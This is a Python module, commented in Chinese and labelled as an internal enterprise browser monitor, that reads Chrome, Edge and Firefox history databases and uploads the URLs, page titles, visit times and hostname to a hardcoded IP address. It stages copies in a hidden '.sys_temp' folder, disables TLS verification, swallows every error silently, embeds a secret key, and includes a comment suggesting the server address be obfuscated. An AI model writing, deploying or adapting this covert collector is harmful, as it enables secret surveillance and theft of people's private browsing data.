"""
浏览器监测模块 - 企业内部使用
读取浏览器历史记录并上传到服务器
"""

import os
import sqlite3
import shutil
import json
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
import platform
import aiohttp
import asyncio
from typing import List, Dict, Optional


class BrowserMonitor:
    """浏览器监测类"""
    
    def __init__(self, server_url: str = None):
        """
        初始化浏览器监测
        
        Args:
            server_url: 服务器地址
        """
        self._server = server_url or self._get_server_url()
        self._temp_dir = Path(os.getenv('TEMP') or '/tmp') / '.sys_temp'
        self._temp_dir.mkdir(exist_ok=True)
    
    def _get_server_url(self) -> str:
        """获取服务器地址"""
        # 服务器配置（可以混淆或加密存储）
        SERVER_CONFIG = {
            'host': '101.126.43.94',
            'port': 8000,
            'endpoint': '/api/monitor',
            'timeout': 10,
            'max_retries': 3,
            'retry_delay': 2
        }
        return f"http://{SERVER_CONFIG['host']}:{SERVER_CONFIG['port']}{SERVER_CONFIG['endpoint']}"
    
    def get_chrome_history(self, days: int = 7) -> List[Dict]:
        """
        获取Chrome浏览器历史记录
        
        Args:
            days: 获取最近几天的记录
            
        Returns:
            历史记录列表
        """
        history = []
        
        try:
            # Chrome历史记录数据库路径
            if platform.system() == "Windows":
                chrome_path = Path(os.getenv('LOCALAPPDATA')) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'History'
            elif platform.system() == "Darwin":  # macOS
                chrome_path = Path.home() / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
            else:  # Linux
                chrome_path = Path.home() / '.config' / 'google-chrome' / 'Default' / 'History'
            
            if not chrome_path.exists():
                return history
            
            # 复制数据库文件（避免锁定）
            temp_db = self._temp_dir / f'chrome_history_{datetime.now().timestamp()}.db'
            shutil.copy2(chrome_path, temp_db)
            
            # 读取历史记录
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # 计算时间范围（Chrome使用WebKit时间戳）
            cutoff_time = datetime.now() - timedelta(days=days)
            webkit_time = int((cutoff_time.timestamp() + 11644473600) * 1000000)
            
            cursor.execute('''
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE last_visit_time > ?
                ORDER BY last_visit_time DESC
                LIMIT 1000
            ''', (webkit_time,))
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                
                # 转换WebKit时间戳为Python datetime
                timestamp = (last_visit_time / 1000000) - 11644473600
                visit_time = datetime.fromtimestamp(timestamp)
                
                history.append({
                    'url': url,
                    'title': title or '',
                    'visit_count': visit_count,
                    'last_visit': visit_time.isoformat(),
                    'browser': 'Chrome'
                })
            
            conn.close()
            temp_db.unlink()  # 删除临时文件
            
        except Exception as e:
            # 静默处理错误
            pass
        
        return history
    
    def get_edge_history(self, days: int = 7) -> List[Dict]:
        """获取Edge浏览器历史记录"""
        history = []
        
        try:
            if platform.system() == "Windows":
                edge_path = Path(os.getenv('LOCALAPPDATA')) / 'Microsoft' / 'Edge' / 'User Data' / 'Default' / 'History'
            elif platform.system() == "Darwin":
                edge_path = Path.home() / 'Library' / 'Application Support' / 'Microsoft Edge' / 'Default' / 'History'
            else:
                edge_path = Path.home() / '.config' / 'microsoft-edge' / 'Default' / 'History'
            
            if not edge_path.exists():
                return history
            
            temp_db = self._temp_dir / f'edge_history_{datetime.now().timestamp()}.db'
            shutil.copy2(edge_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cutoff_time = datetime.now() - timedelta(days=days)
            webkit_time = int((cutoff_time.timestamp() + 11644473600) * 1000000)
            
            cursor.execute('''
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE last_visit_time > ?
                ORDER BY last_visit_time DESC
                LIMIT 1000
            ''', (webkit_time,))
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                timestamp = (last_visit_time / 1000000) - 11644473600
                visit_time = datetime.fromtimestamp(timestamp)
                
                history.append({
                    'url': url,
                    'title': title or '',
                    'visit_count': visit_count,
                    'last_visit': visit_time.isoformat(),
                    'browser': 'Edge'
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            pass
        
        return history
    
    def get_firefox_history(self, days: int = 7) -> List[Dict]:
        """获取Firefox浏览器历史记录"""
        history = []
        
        try:
            if platform.system() == "Windows":
                firefox_base = Path(os.getenv('APPDATA')) / 'Mozilla' / 'Firefox' / 'Profiles'
            elif platform.system() == "Darwin":
                firefox_base = Path.home() / 'Library' / 'Application Support' / 'Firefox' / 'Profiles'
            else:
                firefox_base = Path.home() / '.mozilla' / 'firefox'
            
            if not firefox_base.exists():
                return history
            
            # 查找默认配置文件
            profile_dirs = [d for d in firefox_base.iterdir() if d.is_dir() and 'default' in d.name.lower()]
            if not profile_dirs:
                return history
            
            places_db = profile_dirs[0] / 'places.sqlite'
            if not places_db.exists():
                return history
            
            temp_db = self._temp_dir / f'firefox_history_{datetime.now().timestamp()}.db'
            shutil.copy2(places_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cutoff_time = datetime.now() - timedelta(days=days)
            # Firefox使用微秒时间戳
            firefox_time = int(cutoff_time.timestamp() * 1000000)
            
            cursor.execute('''
                SELECT url, title, visit_count, last_visit_date
                FROM moz_places
                WHERE last_visit_date > ?
                ORDER BY last_visit_date DESC
                LIMIT 1000
            ''', (firefox_time,))
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                if last_visit_date:
                    visit_time = datetime.fromtimestamp(last_visit_date / 1000000)
                    
                    history.append({
                        'url': url,
                        'title': title or '',
                        'visit_count': visit_count,
                        'last_visit': visit_time.isoformat(),
                        'browser': 'Firefox'
                    })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            pass
        
        return history
    
    def get_all_browser_history(self, days: int = 7) -> List[Dict]:
        """
        获取所有浏览器的历史记录
        
        Args:
            days: 获取最近几天的记录
            
        Returns:
            合并的历史记录列表
        """
        all_history = []
        
        # 获取各浏览器历史
        all_history.extend(self.get_chrome_history(days))
        all_history.extend(self.get_edge_history(days))
        all_history.extend(self.get_firefox_history(days))
        
        # 按时间排序
        all_history.sort(key=lambda x: x['last_visit'], reverse=True)
        
        return all_history
    
    def _generate_signature(self, data: dict, secret_key: str) -> str:
        """生成数据签名"""
        sorted_data = json.dumps(data, sort_keys=True)
        signature = hashlib.sha256(f"{sorted_data}{secret_key}".encode()).hexdigest()
        return signature
    
    async def upload_history(self, device_id: str, history: List[Dict], secret_key: str = "4202e5a056bfb21ba1105e301ecc1862d87c3b14c328d8b1dc58ced1c9418e30") -> bool:
        """
        上传浏览器历史记录到服务器
        
        Args:
            device_id: 设备ID
            history: 历史记录列表
            secret_key: 密钥（与授权系统相同）
            
        Returns:
            是否上传成功
        """
        try:
            # 构造上传数据
            payload = {
                'device_id': device_id,
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'hostname': platform.node(),
                'record_count': len(history),
                'history': history[:500]  # 限制数量，避免数据过大
            }
            
            # 生成签名
            signature = self._generate_signature(payload, secret_key)
            payload['signature'] = signature
            
            # 上传到服务器
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self._server,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=30),
                    ssl=False
                ) as response:
                    if response.status == 200:
                        return True
                    else:
                        return False
        
        except Exception as e:
            # 静默失败
            return False
    
    def collect_and_upload_sync(self, device_id: str, days: int = 7) -> bool:
        """
        同步方式收集并上传浏览器历史
        
        Args:
            device_id: 设备ID
            days: 收集最近几天的记录
            
        Returns:
            是否成功
        """
        try:
            # 收集历史记录
            history = self.get_all_browser_history(days)
            
            if not history:
                return True  # 没有记录也算成功
            
            # 上传
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(
                self.upload_history(device_id, history)
            )
            loop.close()
            
            return result
        except:
            return False


def collect_browser_data(device_id: str, days: int = 7) -> bool:
    """
    便捷函数：收集并上传浏览器数据
    
    Args:
        device_id: 设备ID
        days: 收集天数
        
    Returns:
        是否成功
    """
    monitor = BrowserMonitor()
    return monitor.collect_and_upload_sync(device_id, days)


if __name__ == "__main__":
    # 测试代码
    monitor = BrowserMonitor()
    
    print("正在收集浏览器历史记录...")
    history = monitor.get_all_browser_history(days=1)
    
    print(f"\n找到 {len(history)} 条记录")
    
    if history:
        print("\n最近的10条记录:")
        for i, record in enumerate(history[:10], 1):
            print(f"{i}. [{record['browser']}] {record['title'][:50]}")
            print(f"   {record['url'][:80]}")
            print(f"   访问时间: {record['last_visit']}")
            print()
